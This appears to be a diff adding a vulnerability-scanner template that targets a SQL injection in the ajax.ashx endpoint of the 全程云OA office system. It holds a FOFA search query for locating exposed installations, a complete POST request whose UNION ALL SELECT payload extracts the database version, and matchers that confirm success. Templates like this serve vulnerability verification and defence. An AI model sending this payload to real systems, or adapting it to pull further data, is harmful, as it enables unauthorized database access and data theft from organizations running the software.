@@ -1,0 +1,28 @@
+## id: VEID-2024-0102
+## name: 全程云OA__ajax.ashxSQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description:全程云OA__ajax.ashxSQ存在SQL注入
+## fofa-query: ".passImg{background:url(images/yiyaoshi.png)"
+## verification: true
+
+
+POST /OA/common/mod/ajax.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "text"
+#@ matcher: body contains "ProductColumn"
+
+
+
+
+
+# @VEIL-STAMP: 8dac1e9fa17408525c352ac2bf38ba79caad9a95dbc266a239a53bc288838bf1
